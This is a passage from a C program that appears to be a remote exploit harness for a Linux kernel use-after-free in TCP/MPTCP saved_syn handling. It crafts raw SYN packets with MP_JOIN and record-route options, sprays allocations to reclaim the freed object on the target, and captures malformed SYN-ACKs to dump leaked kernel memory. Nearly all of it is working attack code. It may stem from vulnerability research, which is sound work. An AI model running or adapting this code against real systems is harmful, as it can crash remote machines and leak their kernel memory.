    dst.sin_family = AF_INET;
    inet_pton(AF_INET, g_dst_ip_str, &dst.sin_addr);
    int saved = getenv("SAVED_SYN_SPRAY") != NULL;
    int varyport = getenv("SPRAY_VARYPORT") != NULL;
    uint16_t vport = g_spray_sport;
    double last = 0;
    uint64_t sent = 0;
    while (g_run) {
        double now = now_us();
        if (now - last >= g_spray_spacing_us) {
            if (saved) {
                struct sockaddr_in sd = dst;
                sd.sin_port = htons(g_spray_dport);
                const unsigned char *pkt = g_saved_spray;
                int plen = g_saved_len;
                if (varyport) {
                    vport++;
                    if (vport == 0) vport = g_spray_sport;
                    patch_spray_sport(vport);
                } else if (g_rot_n > 0) {
                    int ri = g_rot_used++ % g_rot_n;
                    pkt = g_rot_pkt[ri];
                    plen = g_rot_len[ri];
                }
                if (sendto(s, pkt, plen, 0,
                           (struct sockaddr *)&sd, sizeof(sd)) > 0)
                    sent++;
            } else if (sendto(s, g_spray_syn, IPHDR + 20 + 12, 0,
                       (struct sockaddr *)&dst, sizeof(dst)) > 0)
                sent++;
            last = now;
        } else {
            for (volatile int i = 0; i < 20; i++) ;
        }
        if ((sent & 0xFFFF) == 0) {
            __sync_fetch_and_add(&g_reuse, 0);   /* no-op barrier */
            g_spray_sent = sent;
        }
    }
    g_spray_sent = sent;
    return NULL;
}

/* AF_PACKET leak capture: an over-read SYN-ACK has an invalid IP IHL, so the
 * kernel's IP stack drops it before a raw IP socket sees it.  AF_PACKET sees
 * the frame on the wire. */
static void *leakcap_fn(void *arg) {
    (void)arg;
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) return NULL;
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = (int)if_nametoindex("ens4");
    if (bind(s, (struct sockaddr *)&sll, sizeof(sll)) < 0) { close(s); return NULL; }
    unsigned char buf[9000];
    uint32_t tgt; inet_pton(AF_INET, g_dst_ip_str, &tgt);
    while (g_run) {
        ssize_t n = recv(s, buf, sizeof(buf), 0);
        if (n < 14 + 40) continue;
        unsigned char *ip = buf + 14;
        if ((ip[0] >> 4) != 4) continue;
        uint32_t src; memcpy(&src, ip + 12, 4);
        if (src != tgt) continue;
        /* An over-read SYN-ACK has IP options (ihl != 5) whose bytes are the
         * reclaimed saved_syn's TCP header.  With a varying-port spray the
         * source port is not fixed, so accept any malformed-options frame
         * except the normal leading NOP+RR pattern (01 07) of handshake
         * SYN-ACKs. */
        int ihl = ip[0] & 0xf;
        if (ihl == 5) continue;
        if (ihl == 15 && (ip[20] == 0x07 ||
                          (ip[20] == 0x01 && ip[21] == 0x07))) continue;
        if (!getenv("LEAK_ANY") && g_spray_sport &&
            !(ip[20] == ((g_spray_sport >> 8) & 0xff) &&
              ip[21] == (g_spray_sport & 0xff))) continue;
        if (n < 14 + 40) continue;
        int lim = (int)(n - 14); if (lim > 400) lim = 400;
        char line[1024];
        int q = snprintf(line, sizeof(line), "[LEAK] ihl=%d n=%d ", ihl, (int)(n - 14));
        for (int i = 0; i < lim && q < (int)sizeof(line) - 3; i++)
            q += snprintf(line + q, sizeof(line) - q, "%02x", ip[i]);
        line[q++] = '\n';
        fwrite(line, 1, q, stderr);
    }
    close(s);
    return NULL;
}

/* SPRAY_SPORTS: one spray stream per source port.  Each tuple gets its own
 * request stream (and therefore its own ~9k saved_syn allocs/s on the target),
 * multiplying the reclaim rate while keeping every allocation on the same
 * RPS CPU.  The packet is built per thread (same source IP/dport/options). */
static void *saved_spray_thread(void *arg) {
    long sport = (long)arg;
    unsigned char pkt[128];
    build_saved_spray(pkt, (uint16_t)sport, g_spray_dport,
                      0x50000000u + (uint32_t)sport);
    int len = g_saved_len;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in sd;
    memset(&sd, 0, sizeof(sd));
    sd.sin_family = AF_INET;
    inet_pton(AF_INET, g_dst_ip_str, &sd.sin_addr);
    sd.sin_port = htons(g_spray_dport);
    double last = 0;
    while (g_run) {
        double now = now_us();
        if (now - last >= g_spray_spacing_us) {
            sendto(s, pkt, len, 0, (struct sockaddr *)&sd, sizeof(sd));
            __sync_fetch_and_add(&g_spray_sent, 1);
            last = now;
        } else {
            for (volatile int i = 0; i < 20; i++) ;
        }
    }
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 6) {
        fprintf(stderr, "usage: %s <port> <token_hex> <sport> <runtime_s> "
                        "<spacing_us> [nstorm] [spray_sport] "
                        "[spray_spacing_us]\n"
                "  spray_sport != 0 enables the controlled-reclaim spray "
                "(CPU 0)\n", argv[0]);
        return 1;
    }
    int port = atoi(argv[1]);
    unsigned char tok[4];
    for (int i = 0; i < 4; i++) {
        unsigned b;
        sscanf(argv[2] + 2 * i, "%2x", &b);
        tok[i] = (unsigned char)b;
    }
    g_sport = (uint16_t)atoi(argv[3]);
    g_varyport = getenv("STORM_VARYPORT") != NULL;
    int runtime = atoi(argv[4]);
    long spacing = atol(argv[5]);
    int nstorm = argc > 6 ? atoi(argv[6]) : 3;
    g_spray_sport = argc > 7 ? (uint16_t)atoi(argv[7]) : 0;
    g_spray_spacing_us = argc > 8 ? atol(argv[8]) : 100;
    g_dport = port;
    if (argc > 10 && argv[10][0])
        g_client_isn = (uint32_t)strtoul(argv[10], NULL, 16);
    else
        g_client_isn = 0x30000000u + g_sport;
    if (argc > 9 && argv[9][0]) {
        snprintf(g_src_ip_str, sizeof(g_src_ip_str), "%s", argv[9]);
    }
    if (argc > 11 && argv[11][0]) {
        snprintf(g_dst_ip_str, sizeof(g_dst_ip_str), "%s", argv[11]);
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    /* MP_JOIN SYN TCP option (subtype 1 in the upper nibble) */
    unsigned char mpj[12];
    mpj[0] = MPTCP_KIND; mpj[1] = 12; mpj[2] = 0x10; mpj[3] = 0x00;
    memcpy(mpj + 4, tok, 4);
    mpj[8] = 0x11; mpj[9] = 0x22; mpj[10] = 0x33; mpj[11] = 0x44;

    /* SYN: marker 0x5AA5xxxx at RR slots 1-3 (opt bytes 27,31,35);
     * final ACK template (no TCP options) */
    build(g_syn, g_sport, port, g_client_isn, 0, 0x02, mpj, 12,
          0x5AA50000u | g_sport, RR_TAIL_OFF);
    build(g_ack, g_sport, port, g_client_isn + 1, 0, 0x10, NULL, 0,
          0x5AA50000u | g_sport, RR_TAIL_OFF);
    build_noip(g_ack_nip, g_sport, port, g_client_isn + 1, 0, 0x10);

    if (getenv("SPRAY_DPORT")) g_spray_dport = (uint16_t)atoi(getenv("SPRAY_DPORT"));
    if (getenv("SPRAY_SRC")) snprintf(g_spray_src, sizeof(g_spray_src), "%s", getenv("SPRAY_SRC"));
    /* spray SYN: marker 0x5BB5xxxx at RR slots 6-8 (opt bytes 47,51,55),
     * or (SAVED_SYN_SPRAY) a no-IP-option SYN with 40B TCP options. */
    if (g_spray_sport) {
        if (getenv("SAVED_SYN_SPRAY")) {
            g_spray_marker = 0x53535353u;   /* distinctive saved_syn marker */
            build_saved_spray(g_saved_spray, g_spray_sport, g_spray_dport,
                              0x50000000u + g_spray_sport);
        } else {
            g_spray_marker = 0x5BB50000u | g_spray_sport;
            g_spray_isn = 0x40000000u + g_spray_sport;
            build(g_spray_syn, g_spray_sport, port, g_spray_isn, 0, 0x02, mpj, 12,
                  g_spray_marker, 47);
            build(g_spray_ack, g_spray_sport, port, g_spray_isn + 1, 0, 0x10,
                  NULL, 0, g_spray_marker, 47);
        }
    }
    /* rotating saved_syn ports (SPRAY_PORTS=a,b,c) */
    {
        const char *pl = getenv("SPRAY_PORTS");
        if (pl && getenv("SAVED_SYN_SPRAY")) {
            char tmp[512];
            snprintf(tmp, sizeof(tmp), "%s", pl);
            char *sv = NULL, *tk = strtok_r(tmp, ",", &sv);
            g_rot_n = 0;
            while (tk && g_rot_n < 64) {
                int sp = atoi(tk);
                if (sp > 0) {
                    build_saved_spray(g_rot_pkt[g_rot_n], (uint16_t)sp,
                                      g_spray_dport, 0x50000000u + (uint32_t)sp);
                    g_rot_len[g_rot_n] = g_saved_len;
                    g_rot_n++;
                }
                tk = strtok_r(NULL, ",", &sv);
            }
        }
    }

    /* debug: dump the exact SYN buffer for in-flight mutation diffing */
    fprintf(stderr, "g_syn built (%zu bytes): ", (size_t)(IPHDR + 32));
    for (int i = 0; i < IPHDR + 32; i++)
        fprintf(stderr, "%02x", g_syn[i]);
    fprintf(stderr, "\n");

    pthread_t th;
    pthread_create(&th, NULL, capture_fn, NULL);
    if (getenv("LEAK_DUMP")) {
        pthread_t thl;
        pthread_create(&thl, NULL, leakcap_fn, NULL);
    }
    while (!g_cap_ready) usleep(200);
    /* STORM_CPU lets the whole UAF lifecycle share one CPU. Default spreads
     * storm threads over 1..n (save_options then allocates on CPU 1+ while the
     * dispose free lands on CPU 0 - a remote free whose slot the home CPU's own
     * save_options reclaims, starving the spray on non-slub_debug boots).
     * STORM_CPU=0 pins the storm to CPU 0 (the capture/dispose CPU): alloc and
     * free are CPU-0-local, so the CPU-0 spray reclaims the slot by LIFO. */
    int storm_cpu = getenv("STORM_CPU") ? atoi(getenv("STORM_CPU")) : 1;
    for (int i = 0; i < nstorm; i++)
        pthread_create(&th, NULL, storm_fn,
                       (void *)(long)((spacing << 8) | ((storm_cpu + i) & 3)));
    const char *sportlist = getenv("SPRAY_SPORTS");
    if (getenv("NO_SPRAY_THREAD")) {
        /* g_spray_sport is used only for ACK_SPRAY */
    } else if (sportlist) {
        char tmp[256];
        snprintf(tmp, sizeof(tmp), "%s", sportlist);
        char *save = NULL, *tok = strtok_r(tmp, ",", &save);
        while (tok) {
            long sp = atol(tok);
            if (sp > 0)
                pthread_create(&th, NULL, saved_spray_thread, (void *)sp);
            tok = strtok_r(NULL, ",", &save);
        }
    } else if (g_spray_sport) {
        pthread_create(&th, NULL, spray_fn, NULL);
    }

    printf("[*] cycling: port=%d sport=%u spacing=%ldus nstorm=%d "
           "runtime=%ds spray=%u@%ldus\n",
           port, g_sport, spacing, nstorm, runtime,
           g_spray_sport, g_spray_spacing_us);
    time_t t0 = time(NULL);
    uint64_t last_synacks = 0;
    while (time(NULL) - t0 < runtime) {
        sleep(5);
        printf("[t+%3lds] syn_sent=%llu synacks=%llu acks=%llu spray=%llu "
               "POISON=%llu foreign=%llu REUSE=%llu (d_synacks=%lld)\n",
               (long)(time(NULL) - t0),
               (unsigned long long)g_syn_sent,
               (unsigned long long)g_synacks,
               (unsigned long long)g_acks_sent,
               (unsigned long long)g_spray_sent,
               (unsigned long long)g_poison,
               (unsigned long long)g_foreign,
               (unsigned long long)g_reuse,
               (long long)(g_synacks - last_synacks));
        last_synacks = g_synacks;
        if (g_poison) {
            printf("[!!!] UAF OBSERVED (poison reads): %llu\n",
                   (unsigned long long)g_poison);
        }
        if (g_reuse) {
            printf("[###] CONTROLLED REUSE OBSERVED: %llu spray-marker "
                   "reads in main-tuple SYN-ACKs\n",
                   (unsigned long long)g_reuse);
        }
    }
    g_run = 0;
    sleep(1);
    printf("== DONE syn_sent=%llu synacks=%llu acks=%llu poison=%llu "
           "reuse=%llu\n",
           (unsigned long long)g_syn_sent, (unsigned long long)g_synacks,
           (unsigned long long)g_acks_sent, (unsigned long long)g_poison,
           (unsigned long long)g_reuse);
    printf("== L histogram (SYN-ACK -> dispose RST):\n");
    for (int b = 0; b < 64; b++)
        if (g_hist[b])
            printf("   %2d-%2d us: %llu\n", b, b + 1,
                   (unsigned long long)g_hist[b]);
    _exit((g_poison || g_reuse) ? 0 : 2);
}
